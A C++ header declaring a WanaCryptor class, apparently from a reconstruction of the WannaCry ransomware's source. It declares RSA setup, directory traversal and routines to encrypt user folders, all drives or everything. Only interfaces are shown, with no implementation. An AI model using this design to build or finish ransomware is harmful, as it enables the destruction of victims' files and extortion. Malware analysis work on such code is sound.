#pragma once

#include <Windows.h>
#include "WanaZip.h"
#include "FileList.h"

class WanaCryptor
{
	PWanaZip m_pWanaZip;
	PFileList m_pFileList;
	TCHAR m_BasePath[MAX_PATH];
	ULONG m_TotalFile;
	LARGE_INTEGER m_TotalSize;

	BOOL Init();
	BOOL SetupRSA(DWORD, PUCHAR, ULONG);
	BOOL InitWanaZip(DWORD);
	ULONG SelectEncryptAction(PFileInfo, ULONG);
	BOOL EncryptDispatch(PFileInfo, ULONG);
	BOOL EncryptTraverse(LPCTSTR);
	BOOL EncryptFileList();
public:
	WanaCryptor();
	WanaCryptor(PUCHAR pbPublicKey, ULONG cbPublicKey);
	~WanaCryptor();
	BOOL Encrypt(LPCTSTR);
	BOOL EncryptUsers();
	BOOL EncryptDrivers();
	BOOL EncryptAll();
	ULONG GetTotalFile();
	BOOL GetTotalSize(PLARGE_INTEGER);
};

typedef WanaCryptor *PWanaCryptor;

BOOL CheckDKYFileValid(DWORD);
BOOL GetDecryptFlag();

// extern BOOL gbDecryptFlag;